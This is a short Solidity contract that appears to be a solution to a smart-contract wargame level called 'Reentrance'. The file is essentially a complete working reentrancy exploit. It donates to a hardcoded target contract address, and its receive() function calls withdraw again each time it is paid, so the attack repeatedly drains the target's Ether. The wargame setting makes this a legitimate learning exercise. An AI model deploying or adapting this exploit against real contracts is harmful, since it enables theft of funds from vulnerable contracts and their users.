// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel10.sol";

contract Reenter{

    Reentrance level10 = Reentrance(0xab6E1Cd1cAC4b1d966956CEF9b09e8F12E869bea);
    
    constructor () public payable {}
    function donate(address _to) external payable {
        level10.donate{value: 0.001 ether}(_to);
    }

    function withdraw() external{
        level10.withdraw(0.001 ether);
    }

    function getBalance(address _who) external view returns (uint){
        return address(_who).balance;
    }

    function fundmeback(address payable _to) external payable{
        require(_to.send(address(this).balance), "could not send Ether");
    }
    receive() external payable {
        level10.withdraw(msg.value);
    }

}